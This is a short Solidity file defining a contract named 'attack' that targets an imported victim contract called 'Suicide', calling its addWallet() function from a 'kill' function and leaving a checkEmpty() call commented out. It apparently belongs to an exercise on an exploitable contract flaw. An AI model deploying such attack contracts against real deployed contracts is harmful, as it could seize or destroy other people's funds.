pragma solidity ^0.7.0;
import "./victim.sol";

contract attack{
    Suicide victimContract;
    constructor( address _victimContractAddress){
        victimContract = Suicide(_victimContractAddress);
    }
    
    fallback() external payable {

    }
    
    function kill() payable public{
        victimContract.addWallet();
        // victimContract.checkEmpty();
    }

    receive() external payable{

    }
} 